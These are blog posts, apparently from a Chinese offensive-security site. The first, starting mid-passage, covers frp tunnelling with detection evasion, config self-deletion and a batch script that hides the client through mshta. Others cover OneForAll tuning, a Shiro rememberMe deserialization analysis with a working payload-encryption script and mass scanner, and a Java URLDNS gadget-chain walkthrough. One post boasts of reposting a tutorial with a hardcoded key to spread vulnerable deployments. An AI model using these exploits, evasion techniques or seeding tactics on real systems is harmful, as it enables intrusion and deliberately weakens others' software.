json:&quot;a&quot;`来逃避流量识别，以此类推 非TLS特征明显 frpc.ini 加入tls_enable = true 从 v0.25.0 版本开始 frpc 和 frps 之间支持通过 TLS 协议加密传输。通过在 frpc.ini 的 common 中配置 tlsenable = true 来启用此功能，安全性更高。为了端口复用，frp 建立 TLS 连接的第一个字节为 0x17。通过将 frps.ini 的 [common] 中 tlsonly 设置为 true，可以强制 frps 只接受 TLS 连接。 第一个字节为0x17导致虽tls但特征明显 篇幅较长，推荐此参考链接，第一个字节为0x17的特征修改 如果是最新版frp，0x17的变量改名了,注意区分 客户端的敏感配置文件 目前我知道的是3种解决办法，自选即可 使用远程加载配置文件，修改方法参考此链接远程加载配置文件 配置文件自删除，修改方法参考此链接配置文件自删除 将客户端改成IP和port为传入参数，不加载配置文件，修改方法参考此链接传参版客户端 0x03 frp使用 配置文件和frp根据自身使用情况修改，比如添加域前置或研究使用其他协议进行传输 服务端配置文件及启动，后台运行参考使用nohup命令或者以服务运行 [common] bind_port = 80 客户端配置文件及启动 [common] server_addr = x.x.x.x server_port = 80 protocol = tcp tls_enable = true [plugin_socks5] type = tcp remote_port = 6006 plugin = socks5 windows后台运行的bat参考代码 @echo off if &quot;%1&quot; == &quot;h&quot; goto begin mshta vbscript:createobject(&quot;wscript.shell&quot;).run(&quot;%~nx0 h&quot;,0)(window.close)&amp;&amp;exit :begin c:\\frpc.exe -c c:\\frpc.ini 此时连接服务端的socks5端口即可代理客户端的流量 以msf为例，扫描的IP为与客户端机器同一网段的其他windows7机器 ","link":"https://www.svenbeast.com/post/HUSusAA15/"},{"title":"红色消失术☞oneforall的小改动","content":"先运行起来 1.各api，自行用小飞机进行注册好 解决红色报错 1.yahoo模块报错，代码中获得配置中的代理没生效，遂报错(提了issus)，在yahoo.py的第24行插入 self.proxy = self.get_proxy(self.source) 2.github的接口使用的语法有问题，没找到解决办法，遂忽略。没提issus，(-懒 3.Fofa的模块等同于不存在，抓了下包，是因为使用的语法需要币，肯定没有，忽略忽略 4.google_api的模块，header不需要了，加上key的header头反而会显示认证错误 将google_api.py的29行代码注释掉即可 5.114.55.181.28/check_web/databaseInfo_mainSearch.action这个是api升级了，一直没恢复，忽略 解决一些超时红色 1.oneforall设置的默认超时太短了，大部分网络应该达不到要求，default.py的101行代码斟酌修改一下 request_timeout_second = (17.05, 27) # 请求超时秒数(默认connect timout推荐略大于3秒) 2.oneforall里的一些国外网站的模块，虽然国内访问慢，但是能访问，所以默认是即便你设置了代理也并没有对这些模块生效，会大概率超时红色。setting.py的66行我的配置是以下的，全不全不太清楚，因为我关闭了大部分模块，只保留了oneforall独有的模块 proxy_partial_module = ['GoogleQuery', 'AskSearch', 'DuckDuckGoSearch', 'GoogleAPISearch', 'GoogleSearch', 'YahooSearch', 'YandexSearch', 'CrossDomainXml', 'ContentSecurityPolicy', 'GithubAPISearch', 'HackerTargetQuery', 'QianXunQuery', 'AskSearch', 'VirusTotalAPIQuery', 'Sublist3rQuery','ArchiveCrawl','CommonCrawl'] # 代理自定义的模块 3.虽然oneforall存在设置所有模块都启用代理的选项，但真设置了也会有问题，没深究。 4.个人的一些需求—我关闭了oneforall与subfinder重叠的模块，保留了他独有的，是在setting的33行代码设置的，当然32行要写改为False，下面是我筛选出来准备启用的 enable_partial_module = ['modules.certificates.google','modules.check.axfr','modules.check.cdx','modules.check.cert','modules.check.csp','modules.check.nsec','modules.check.robots','modules.check.sitemap','modules.crawl.archivecrawl','modules.crawl.commoncrawl','modules.datasets.chinaz_api','modules.datasets.chinaz','modules.datasets.cloudflare_api','modules.datasets.ip138','modules.datasets.netcraft','modules.datasets.qianxun','modules.datasets.wzpc','modules.dnsquery.mx','modules.dnsquery.ns','modules.dnsquery.soa','modules.dnsquery.spf','modules.dnsquery.txt','modules.intelligence.riskiq_api','modules.search.ask','modules.search.baidu','modules.search.ask','modules.search.bing','modules.search.gitee','modules.search.google_api','modules.search.google','modules.search.so','modules.search.sogou','modules.search.yahoo','modules.search.yandex'] # 启用部分收集模块 必须禁用enable_all_module才能生效 5.同时我也关闭了爆破选项，准备用ksubdomain跑。。 效果图: ","link":"https://www.svenbeast.com/post/V-ayqC-IY/"},{"title":"【教科书】Shiro反序列化利用分析及其他一些有趣的知识","content":"0x00 背景 文章记录了分析shiro反序列化漏洞的思路和过程，漏洞用的次数挺多，感觉不认真走一遍分析还是缺点什么。排版是按照从issues中获得信息一步步分析的思路进行排版的， 不太专业 见谅 ┭┮﹏┭┮ 友情提示：文章写的感觉比较亲民，理论上有一些其他语言的基础都可以阅读，比较倾向于写的详细一些这种写法(废话较多，忽略即可)，大概是看帖按着步骤走跟着思考大概自行理解的程度。 0x01 梦开始的地方 一切都要从官方shiro的某个人提出的问题描述开始说起 ~ 下图为谷歌翻译结果 url: https://issues.apache.org/jira/browse/SHIRO-550 通过描述可知： shiro &lt;= 1.2.4 存在反序列化漏洞 shiro的CookieRememberMeManager类里对漏洞参数rememberMe进行序列化，加密等操作，我理解成这个类和这个漏洞有关系，可以当成入口点 shiro对每次访问都会用到&quot;记住我&quot;的功能进行以下操作： 检索rememberMe cookie的值 //cookie中是否有这个参数 Base 64解码 //对参数的值进行解码 使用AES解密 //对参数的值再进行解密 使用Java序列化（ObjectInputStream）反序列化。 //对解出的参数的值进行反序列化 源代码存在默认的AES加密密钥，所有能够查看源代码的人都可以知道默认密钥是什么 以此确定一个需要通过Debug代码来达成的大概目的： 通过控制rememberMe参数的值传输加密好的恶意序列化payload，成功让shiro进行解密到反序列化的步骤就可以达到执行命令的目的 如何控制rememberMe参数的值 如何对payload进行加密 根据加密方法对生成恶意序列化payload进行加密构造利用工具 0x02 科普时间 AES加密算法：属于对称加密算法，意思就是加密和解密用相同的密钥 加密过程： 明文 --&gt; AES加密函数 + 密钥位数(128/192.256) + iv(初始化向量) + 密钥(key) + 模式(CBC和GCM等) + padding(填充方式)--&gt; 密文 IDEA的Debug按钮功能： Step Over : 单步执行,遇到方法直接获得返回值而不会进入 Step Into : 单步执行,遇到方法会进入方法，不会进入jdk实现的方法中 Force Step Into : 可以进入任何的方法，比如jdk,jar包 Step Out : 在方法内会直接获得返回值跳出该方法 Run To Cursor : 让程序运行到鼠标所在的位置 Drop Frame : 返回上一步，摧毁当前方法获得的值 Resume Program : 运行至下一个断点所在位置 0x03 分析独白 1. 环境配置 研究的前提自然是要搭建好环境 下载shiro的漏洞环境，这里使用war包，放在tomcat的webapps里，启动tomcat，然后war包自动解析成文件夹，使用IDEA打开此文件夹 顺便讲一下IDEA配置调试shiro Run -&gt; Edit Configurations -&gt; 点击+号添加TomcatServer(Local) -&gt; Server中配置Tomcat路径 -&gt; 选择JRE版本 -&gt;Deployment中点击+号添加tomcat里生成的shiro文件夹 -&gt; 点击Apply 运行起来 2. 分析过程 首先第一个目的是控制rememberMe参数的值,先找到参数所在位置，对环境的功能先正常使用一遍 当我访问http://localhost:8080/shiro_web_1_2_4_war/login.jsp 登录时勾选Remember Me后，cookie中出现rememberMe参数，而shiro每次都会对cookie中的rememberMe来进行解密后反序列化操作来确定访问者权限，所以直接在cookie传输rememberMe参数就可以控制shiro反序列化的值 第二个目的是获得加密解密的方法，以此来自行加密解密恶意payload进行传输 反编译此漏洞环境中的shiro组件jar包 选中shiro-core-1.2.4.jar -&gt; 右键 -&gt; Add as Library -&gt; ok 选中shiro-web-1.2.4.jar -&gt; 右键 -&gt; Add as Library -&gt; ok IDEA中按两次shift 搜索咱们前面准备当做入口点的CookieRememberMeManager类，按着函数列表查看后并未发现有关加密的信息，so跟进父类AbstractRememberMeManager去看一下 进入此类可以发现一个很明显的key，根据参数名DEFAULT_CIPHER_KEY_BYTES也可以断定是AES加密中所使用的密钥，同时确实是直接写入了代码中，符合上面通过描述可知的AES密钥硬编码在源代码中的条件 这里我在AbstractRememberMeManager类函数名为encrypt(加密)中下了断点，然后在web端进行登录操作，开始debug，运行至encrypt函数传入参数serialized，然后点击Drop Frame返回上个方法发现传入的serialized的值是我刚才web端登录的用户名root序列化后的数据，根据运行步骤函数名猜测流程是shiro验证完了登录的账号密码，然后根据用户名生成序列化数据准备进行加密了 再次敲黑板 Debug按钮功能： Step Over : 单步执行,遇到方法直接获得返回值而不会进入 Step Into : 单步执行,遇到方法会进入方法，不会进入jdk实现的方法中 Force Step Into : 可以进入任何的方法，比如jdk,jar包 Step Out : 在方法内会直接获得返回值跳出该方法 Run To Cursor : 让程序运行到鼠标所在的位置 Drop Frame : 返回上一步，摧毁当前方法获得的值 Resume Program : 运行至下一个断点所在位置 在调试的变量框里看到加密的设置为AES加密，模式为CBC，128位，填充方式为PKCS5Padding 继续Force Step Into(下一步)，进入cipherService.encrypt的方法中，跳到了JcaCipherService类中的encrypt方法中,方法中有个ivBytes变量，值是随机生成的16个字节，然后跳到了此类中的另一个encrypt方法，就是图片框中下面那个encrypt方法 【+】return this.encrypt(plaintext, key, ivBytes, generate); plaintext 为 序列化的用户名 key 为 DEFAULT_CIPHER_KEY_BYTES 就是上面base64解码的那个密钥 ivBytes 为 随机生成的长度为16的字节 generate 为 true 跳入的encrypt方法，不清楚java的一些方法作用一定要看图片中的备注，这个方法就是真正的生成加密结果的地方，我会描述的详细一点，因为我是垃圾不写就忘 继续Step Over(下一步)，就回到了梦开始(下的断点)的地方 ~，value变量的值就是上面步骤的output变量的值 继续使用Force Step Into(下一步)和Step Out(在方法内直接获得返回值并跳到下一步)调试，盯着存储着加密结果的变量，遇到没有对此变量操作的直接获得返回值下一步，最终到了CookieRememberMeManager类中的rememberSerializedIdentity方法又对存储着加密结果的变量进行了一次base64加密，然后赋值到了cookie的rememberMe参数中，到此加密过程结束。 最终总结加密过程为： 设定：密钥 = kPH+bIxk5D2deZiIxcaaaA== 1.获得明文 = 正常识序列化用户名后的字节(root) 2.以下步骤： 科普知识：正常的AES加密所需参数 = 想加密的字符串 + iv + key + CBC + padding shiro：AES加密 = 想加密的字符串 (明文) + iv(随机生成的长度为16的字节) + key(base64解码密钥的结果) + CBC + PKCS5Padding 3.随机生成的长度为16的字节 + AES加密结果 (就是拼接了一下) 4.base64加密 那么解密过程为: 设定：密钥 = kPH+bIxk5D2deZiIxcaaaA== 1.获得密文 = base64解密rememberMe参数传过来的值 2.以下步骤： 科普知识：正常的AES解密所需参数 = 想解密的字符串 + iv + key + CBC shiro：AES解密 = 想解密的字符串(删除密文前16个字节的剩余字节)+iv(密文的前16个字节) + key(base64解码密钥的结果) + CBC + PKCS5Padding 3.对解密结果进行反序列化，触发payload ​ 在进行第三个目的前看一下最终触发反序列化的地方在哪里，按照加密方法调试过程，在解密方法处添加断点，然后在网页上先登录后，开启调试，运行至decrypt方法停住后进行Force Step Into(下一步)和Step Out(在方法内直接获得返回值并跳到下一步)调试，直到DefaultSerializer的deserialize方法。 ​ 找到shiro进行序列化和反序列化的代码位置后，可以发现shiro的serialize方法使用ByteArrayOutputStream创建了字节数组缓冲区来存储序列化的字节码，而不是生成落地文件，回到deserialize方法，同样生成缓冲区存储传过来的序列化字节，进行反序列化，并最终运行了readObject方法，如果反序列化的是我们的payload，到这里就执行命令了。 第三个目的是构造脚本进行利用，先将shiro的加密过程和解密过程写出来(高版本GCM模式的脚本没写，小改一下就是了) def encode(target): iv = uuid.uuid4().bytes #用好看的方式随机生成16字节 # iv = bytes('1111111111111111',encoding='utf-8') realkey = base64.b64decode(key) #解密key mode = AES.MODE_CBC pad = lambda s: s + ((16 - len(s) % 16) * chr(16 - len(s) % 16)).encode() #CBC模式要求明文长度要是16的倍数，位数不足16位的添加字节补充 resultAES = AES.new(realkey,mode,iv) nice = resultAES.encrypt(pad(target)) nice = iv + nice nice = base64.b64encode(nice) print(&quot;加密目标:\\n&quot; + str(target) + &quot;\\n\\n加密结果:\\n&quot; + nice.decode(&quot;utf-8&quot;) + &quot;\\n&quot;) def decode(target): realkey = base64.b64decode(key) #解密key targetText = base64.b64decode(target) # 想要解密的密文 iv = targetText[0:16] realText = targetText[16:] mode = AES.MODE_CBC resultAES = AES.new(realkey, mode, iv)# 初始化AES参数 nice = (resultAES.decrypt(realText)).decode('utf-8', errors='ignore') #解密密文并设置忽略一些错误防止报错 print(&quot;\\n解密目标:\\n&quot; + target + &quot;\\n\\n解密结果:\\n&quot; + nice + &quot;\\n&quot;) 然后是加上 使用ysoserial生成的java存在反序列化漏洞依赖库的payload，一个利用代码模子就出来了，优秀的工具已经有很多了，就不一一列举了，我的to do里是有整合利用链的想法的，不过yso的cb利用链还在努力自闭中~ 因为我根本就不会java呀 (#.#) ，暂时学习了一些需要的前置知识，然后分析了最简单的URLDNS，有时间我整理一下学习的笔记在水一下。 from Crypto.Cipher import AES import base64,uuid import subprocess decodeTarget = 'iDQHUONAt/tMN2mHSjCMkopnzE0hn1QgCkZ4I5YrOg5mgCVhgUeoY9AIYHe1CasY6+YrBDNJ+8sasUal9wRYCxAYplrqO25KIlyC1FG7wKjDg3H0Q98aH2+PW8TGkM/leP9Wzl3wbC9Z2t8Thg8abQQ2n3+TMZ1JKyi79EZQgIH7KBmmcNaYkKuDwgCYZKKWtHp4jnWJ6O1qhBxQOr87J5Z6t6vUCf7axIZ3VArtTCAqnxwZT2v6zaVZjVLxWbo3rkyi+TE8RamCDMwzT20XkvKJ1xhUDI58iheSw7e2KP6ctQ8x0Hx5tCqSbwNB03yXuWSCAArTl58QKTByoBBk3PNjmcMk47u5EPUTTE5TPcoqhGXUEDSpjc7lQDdFQ4jxU+eWRZY3jPJw4gQAoX9LEPpIRhijNeopA0Im0jFjtqg+rr7ysp5D6KChzOpzgpewANWT2VLAYEoyZXVU/+f7mP56Pz2vyucX9DvliVDDS6D9hcSQw4mrW3pBzuy+A7hM' encodeTarget = 'root' key = 'kPH+bIxk5D2deZiIxcaaaA==' def encode(target): iv = uuid.uuid4().bytes #用好看的方式随机生成16字节 # iv = bytes('1111111111111111',encoding='utf-8') realkey = base64.b64decode(key) #解密key mode = AES.MODE_CBC pad = lambda s: s + ((16 - len(s) % 16) * chr(16 - len(s) % 16)).encode() #CBC模式要求明文长度要是16的倍数，位数不足16位的添加字节补充 resultAES = AES.new(realkey,mode,iv) nice = resultAES.encrypt(pad(target)) nice = iv + nice nice = base64.b64encode(nice) print(&quot;加密目标:\\n&quot; + str(target) + &quot;\\n\\n加密结果:\\n&quot; + nice.decode(&quot;utf-8&quot;) + &quot;\\n&quot;) def decode(target): realkey = base64.b64decode(key) #解密key targetText = base64.b64decode(target) # 想要解密的密文 iv = targetText[0:16] realText = targetText[16:] mode = AES.MODE_CBC resultAES = AES.new(realkey, mode, iv)# 初始化AES参数 nice = (resultAES.decrypt(realText)).decode('utf-8', errors='ignore') #解密密文并设置忽略一些错误防止报错 print(&quot;\\n解密目标:\\n&quot; + target + &quot;\\n\\n解密结果:\\n&quot; + nice + &quot;\\n&quot;) popen = subprocess.Popen('java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections10 &quot;sleep-5&quot;', shell=True, stdout=subprocess.PIPE) file_body = popen.stdout.read() #读取生成的payload字节码 decode(decodeTarget) encode(file_body) 0x04 shiro组件检测 写的一个检测shiro组件的脚本，速度很快。 import requests import sys,re import threadpool #from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings() def exp(line): header={ 'User-agent' : 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0;', 'Cookie':'a=1;rememberMe=1' } check_one=&quot;rememberMe&quot; #场景1 check_two=&quot;deleteMe&quot; #场景2 isExist = False with open('ScanResult.txt',&quot;a&quot;) as f: if 'http' not in line: line = 'http://'+line try: x = requests.head(line,headers=header,allow_redirects=False,verify=False,timeout=6) #场景4 y = str(x.headers) z = checkRe(y) a = requests.head(line,headers=header,verify=False,timeout=6) #场景5 b = str(a.headers) c = checkRe(b) if check_one in y or z or check_two in y or c: isExist = True if isExist: print(&quot;[+ &quot;+&quot;!!! 存在shiro: &quot;+&quot;状态码: &quot;+str(x.status_code)+&quot; url: &quot;+line) f.write(line+&quot;\\n&quot;) else: print(&quot;[- &quot;+&quot;不存在shiro &quot;+&quot;状态码: &quot;+str(x.status_code)+&quot; url: &quot;+line) except Exception as httperror: print(&quot;[- &quot;+&quot;目标超时, 疑似不存活: &quot;+&quot; url: &quot;+line) def checkRe(target): #场景3 pattern = re.compile(u'^re(.*?)Me') result = pattern.search(target) if result: return True else: return False def multithreading(funcname, params=[], filename=&quot;ip.txt&quot;, pools=5): works = [] with open(filename, &quot;r&quot;) as f: for i in f: func_params = [i.rstrip(&quot;\\n&quot;)] + params works.append((func_params, None)) pool = threadpool.ThreadPool(pools) reqs = threadpool.makeRequests(funcname, works) [pool.putRequest(req) for req in reqs] pool.wait() def main(): multithreading(exp, [], &quot;url.txt&quot;, 10) # 默认15线程 print(&quot;全部check完毕，请查看当前目录下的shiro.txt&quot;) if __name__ == &quot;__main__&quot;: main() 判定是否存在shiro的条件: 1.发送带有rememberMe=1的cookie，返回http头是否存在rememberMe 2.发送带有rememberMe=1的cookie，返回http头是否存在deleteMe 3.发送带有rememberMe=1的cookie，返回http头是否存在匹配正则^re(.*?)Me的 4.发送带有rememberMe=1的cookie，请求时脚本设置成跟随跳转后检测前两项 5.发送带有rememberMe=1的cookie，请求时脚本设置成不跟随跳转检测前两项 一开始写的时候检测条件是检测的rememberMe=deleteMe字符串，因为见过网站返回头是下图这样的(开发祭天)，返回http头是remeberMe=deleteMe 。。就分开检测了字符串，再加了个正则保险下。 有的网站会自动跳转到某个路径显示首页，所以设置了跟随跳转和不跟随跳转，没图脑补吧，检测思路是这样的，有的站的shiro组件存在检测还要是登录页输入账号密码登录时的那个路径或者和post提交有关，所以可以再加个post方式请求的判断条件，还可以学爬虫自动输入账号密码post提交这种的判断条件，具体代码就得自行发挥啦 0x05 shiro组件的默认gadget Shiro是开源的，所以shiro的源码在github上可以找到，而开发在开发项目的时候如果通过pom.xml引入shiro时，会自动引入commons-beanutils库，而这个依赖库正是存在反序列化利用的java依赖库之一，并且一一查看后发现shiro版本对应的commons-beanutils库的版本有些许不同 查看不同版本shiro的pom.xml后总结对应关系为: Shiro版本 CB链 shiro-root-1.1.0(不包含)—更早版本 1.7.0 shiro-root-1.1.0(包含)—1.3.2(包含) 1.8.3 1.4.0(包含)—1.4.2(包含) 1.9.3 1.5.0(包含)—shiro-root-1.7.0(包含) 1.9.4 然后又去查看了Github上commons-beanutils项目的pom.xml，从1.8.3开始看的，里面是内置了commons-collections链 CB链 CC链 1.8.3 3.2.1 1.9.3 3.2.2 1.9.4 3.2.2 所以最终shiro使用漏洞版本1.2.4或其他高版本shiro但开发自己在shiro的配置文件中固定key导致存在漏洞，几率较高存在的gadget大概就是这样，在往下细节划分及gatget的原理还需要继续有时间再学习了 0x06 增加shiro高版本存在漏洞几率 及 增加普通shiro漏洞几率 无意间查了一下shiro的一些教学，发现了一个排名靠前的&quot;靠谱教程&quot;，虽然他帖子写的是shiro的1.5.3版本，但是发现后面的自定义代码中固定了key:2AvVhdsgUs0FSA3SDFAdag== ，虽然没按照这个部署过，漏洞能不能成功易利用，但是还是要得多顶顶这个帖子 这个帖子越看越好，写的很详细，一定能帮助青涩开发解决使用shiro的难题，然后想了一下&quot;顺便&quot;复制了一下这个帖子，我又发在了简书里Shiro整合前后端分离项目(在Web项目中使用shiro) (还改了标题，增加关键词搜索几率) 同时在其中美中不足的地方进行了修改，使整个帖子对开发更加的友好，简单的改了改图片，加了几句话，有条件的师傅也可以再去博客园，CSDN发几篇，让安全从业者多多帮助懵懂的开发使用shiro组件做权限管理制作出更好的java网站，毕竟安全&amp;开发是一家人的呢 （逃 ","link":"https://www.svenbeast.com/post/jiao-ke-shu-shiro-fan-xu-lie-hua-li-yong-fen-xi-ji-qi-ta-yi-xie-you-qu-de-zhi-shi/"},{"title":"Java反序列化的URLDNS链分析学习","content":"0x01 科普时间 1. 产生java反序列化的必备条件 当Java应用对用户输入，也就是不可信数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，在产生非预期对象的过程中就有可能造成任意代码执行。 为什么Java反序列化的出现率这么高？ 因为Java会给用户提供一些公用库，例如commons-collections,commons-beanutils这些库中实现的一些类可以被反序列化用来实现任意代码执行。 WebLogic、WebSphere、JBoss、Jenkins、OpenNMS这些应用的反序列化漏洞能够得以利用，就是依靠了commons-collections 也就是说，可控的序列化数据 + 公用的java依赖库是导致Java反序列化的根本条件 2. 一些不是基本数据类型的传参 方法中传入的参数类型为参数类型，不是int,String这些基本数据类型是啥意思 意思就是设置了一个该类的对象~ 可以直接调用的啦，不需要在实例化了 public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) { return new TransformedMap(map, keyTransformer, valueTransformer); } 3. java的映射(Map)是什么 Map是java提供的一个官方接口，使用的话就是 import java.util.Map; 作用: 给定一个键和一个值，你可以将该值存储在一个 Map 对象。之后，你可以通过键来访问对应的值。 HashMap类是实现Map接口的一个类，实现上行说的那个功能的具体代码 4. 如何实现类在被反序列化时触发类里的某个方法 在序列化和反序列化过程中需要特殊处理的类必须实现具有以下确切签名的特殊方法： private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException; 5. java反射是什么及个人理解。 反射之中包含了一个「反」字，所以想要解释反射就必须先从「正」开始解释。 一般情况下，我们使用某个类时必定知道它是什么类，是用来做什么的。于是我们直接对这个类进行实例化，之后使用这个类对象进行操作。 Apple apple = new Apple(); //直接初始化，「正射」 apple.setPrice(8999); 上面这样子进行类对象的初始化，我们可以理解为「正射」。 而反射则是一开始并不知道我要初始化的类对象是什么，自然也无法使用 new 关键字来创建对象了。 敲黑板了 [推荐阅读顺序一]https://blog.csdn.net/qq_36226453/article/details/82790375 [推荐阅读顺序二]https://www.cnblogs.com/chanshuyi/p/head_first_of_reflection.html 个人理解： 1.就是java把所有的.class文件当做一个class类，想要用先告诉java你要用哪个class类，然后提供一部分方法实现或者说是细化这个功能 2.就是java把class类里所有的方法当做class类一个子类，想要用就用上步创建的你的目标class对象来调用，提供一部分方法实现或者说是细化这个功能 3.就是java把class类里所有的属性(变量)当做一个class类一个子类，想要用就用上上步创建的你的目标class对象来调用，提供一部分方法实现或者说是细化这个功能 4.想要执行目标类的方法要使用Object object = clazz.newInstance(); 先获得一个对象，就是上上上步获得的目标class对象的newInstance()方法获得一个目标class对象的字节码对象，还得用invoke调用，然后有时候还等同于new一个对象，比如序列化时传入writeObject()的也是这个对象(这步纯个人理解，有点迷糊，好吧我是垃圾) 我写的学习代码 package com.company; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class ReflexDemo { String name = &quot;张三&quot;; int age = 18; public String ReflexDemo() { String result = &quot;name:&quot; + name + &quot; age:&quot; + age; return result; } public String getName(String nameDemo) { this.name = nameDemo; return name; } public int getAge(int ageDemo) { this.age = ageDemo; return age; } public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException { /* 通过反射执行目标类的方法 */ //获取Class对象，我理解为java在运行的时候将运行的所有xxxx.class文件当做一个class类，然后用这个方法在这个大个的class类中获得需要使用的类的对象 Class clazz = Class.forName(&quot;com.company.ReflexDemo&quot;); //在上步获得的Class对象里获得里面的getName方法作为目标方法的对象,传入的就是方法名及需要的参数数据类型 (已知想使用的目标方法名) Method method = clazz.getMethod(&quot;getAge&quot;, int.class); //在上上步获得Class对象获得XXX，就当获得class对象的执行代码的字节码？不知道这步叫啥，我就当成是固定格式了，有的人还会先用getConstructor()方法在用newInstance()，查的时候也说newInstance是获得构造方法的，但是不是构造方法也能用啊，不清楚 Object object = clazz.newInstance(); //用获得目标方法的对象method使用invoke()方法执行此方法，传入的是目标方法的对象和需要的参数 System.out.println(method.invoke(object,15)); /* 通过反射修改目标类的变量 */ Method methodTwo = clazz.getMethod(&quot;ReflexDemo&quot;); System.out.println(&quot;未修改前:&quot; + methodTwo.invoke(object)); Field field = clazz.getDeclaredField(&quot;age&quot;); //获得想要修改的变量名对象 field.setAccessible(true); //设置为允许访问 field.set(object,8); //修改age变量的值为8 System.out.println(&quot;已修改后:&quot; + methodTwo.invoke(object)); } } 本文用到java反射相关的方法 getDeclaredFields() : 使用 Class 对象的 getDeclaredFields() 方法则可以获取包括私有属性在内的所有属性 forName() : 获取Class对象，我理解为java在运行的时候将运行的所有xxxx.class文件当做一个class类，然后用这个方法在这个大个的class类中获得需要使用的类的Class对象 setAccessible() : 将目标类里的变量设置为允许修改状态 set() : 对想要修改的变量值进行赋值 0x02 了解前置知识后的URLDNS利用链构造 package com.company; import java.util.HashMap; import java.io.FileOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.net.URL; public class UrldnsDemo { public static void main(String[] args) throws Exception { HashMap&lt;URL, String&gt; hashMap = new HashMap&lt;URL, String&gt;(); URL url = new URL(&quot;http://y4dehg.dnslog.cn&quot;); url.hashCode(); } } 首先是要知道的是java.net.URL这个类，在创建对象后调用hashCode()方法是会调用getHostAddress()方法的，所以会请求一次域名，跟进的话ctrl/command+鼠标左键点击hashCode()然后在点击hashCode()就能看到getHostAddress了 而java.util.HashMap这个类重写了readObject方法(跟进头部代码import java.util.HashMap的HashMap即可获得源代码)，且设置为此readObject()方法在被反序列化时执行，最终在此方法的代码最下面执行了hash方法传入的参数是从反序列化字节码中得到的key 所以尝试写一下payload，看看能否反序列化时发出dns请求 Map hashMap = new HashMap(); //实例化hashMap类，利用的就是此类他重写的readObject方法，被反序列化时自动调用 URL url = new URL(&quot;http://dskg3c.dnslog.cn&quot;); //实例化URL类，传入准备请求的域名，此对象用来当做key传入hashMap的 hashMap.put(url,&quot;test&quot;); //写入到hashMap中，url为key，test为value，hashMap就是用来存储键值对的一个数据类型 ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;out.bin&quot;)); oos.writeObject(hashMap); ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;out.bin&quot;)); ois.readObject(); 发现在反序列化时无法发出dns请求，后续在HashMap.java的1413行就是hash方法那里打断点跟进后面的代码才知道，就是因为下图显示，满足hashCode!=-1条件，没有执行902行真正的hashCode()方法 所以要更改hashCode变量的值就用到了java的反射，代码修改为 package com.company; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.util.HashMap; import java.io.FileOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.net.URL; import java.util.Map; public class UrldnsDemo { public static void main(String[] args) throws Exception { Map hashMap = new HashMap(); //实例化hashMap类，利用的就是此类他重写的readObject方法，被反序列化时自动调用 URL url = new URL(&quot;http://bqorej.dnslog.cn&quot;); //实例化URL类，传入准备请求的域名，此对象用来当做key传入hashMap的 Class clazz = Class.forName(&quot;java.net.URL&quot;); //获取想要反射的目标类的Class对象 Field f = clazz.getDeclaredField(&quot;hashCode&quot;); //在存储的想要反射的目标类的clazz对象中的所有变量中获得hashCode变量存入f对象 f.setAccessible(true); //设置hashCode变量为允许访问 f.set(url,1); //锦上添花，加上这句就可以在下面这句put的时候让本地不发出dns请求，就跟文章前面的代码没有成功发出dns请求的原理一样，为了让hashCode!=-1 ,就随便赋个值 hashMap.put(url,&quot;test&quot;); //写入到hashMap中，url为key，test为value，hashMap就是用来存储键值对的一个数据类型 f.set(url,-1); //修改的是URL类里的变量，所以传入url对象和要修改的值 ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;out.bin&quot;)); oos.writeObject(hashMap); ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;out.bin&quot;)); ois.readObject(); // Map m1 = new HashMap(); // m1.put(&quot;Zara&quot;, &quot;8&quot;); // m1.put(&quot;Mahnaz&quot;, &quot;31&quot;); // m1.put(&quot;Ayan&quot;, &quot;12&quot;); // m1.put(&quot;Daisy&quot;, &quot;14&quot;); // System.out.println(); // System.out.println(&quot; Map Elements&quot;); // System.out.print(&quot;\\t&quot; + m1); } } 这样就可以实现java在反序列化的时候发出了dns请求 PS：可能说的比较啰嗦，因为我是在理解URLDNS利用链前还得先去了解一些java的知识，一些也写到文章里了，其实就是硬啃o(╥﹏╥)o，后来理解了后觉得URLDNS这个链确实很简单，大部分时间还是在学习前置知识，也方便后续的其他链的学习啦 ","link":"https://www.svenbeast.com/post/java-fan-xu-lie-hua-de-urldns-lian-fen-xi-xue-xi/"},{"title":"Java序列化和反序列化","content":"科普时间 对象：java实例化一个类的时候，可以称为一个对象，或者一个实例，比如下方的myPuppy （其他方法忽略） Puppy myPuppy = new Puppy(&quot;tommy&quot;); 抽象类：父类是将子类所共同拥有的属性和方法进行抽取，这些属性和方法中，有的是已经明确实现了的，有的还无法确定，那么我们就可以将其定义成抽象，在以后的子类中进行重用，进行具体化(就是继承父类的方法名，重新定义方法内容) 用abstract关键字来修饰抽象方法，用abstract来修饰抽象类 抽象方法：在抽象类中的用abstract修饰的方法，只定义个方法名字，没有内容，方便子类继承这个类的时候具体将此方法内容定义出来 package javastudy; public class AbstractDemo1 { public static void main(String[] args) { // TODO Auto-generated method stub } } // 这就是一个抽象类 abstract class Animal { String name; int age; // 动物会叫 这就是一个抽象方法 public abstract void cry(); // 不确定动物怎么叫的。定义成抽象方法，来解决父类方法的不确定性。抽象方法在父类中不能实现，所以没有函数体。但在后续在继承时，要具体实现此方法。 } // 抽象类可以被继承 // 当继承的父类是抽象类时，需要将抽象类中的所有抽象方法全部实现。 class cat extends Animal { // 实现父类的cry抽象方法 public void cry() { System.out.println(&quot;猫叫:&quot;); } } 接口：是抽象方法的集合，接口通常以interface来声明。一个类通过继承接口的方式，从而来继承接口的抽象方法。 //一个简单的接口 interface in1 { // 默认为 Public Static Final final int a =10; // 默认为抽象方法 public and abstract void display(); } 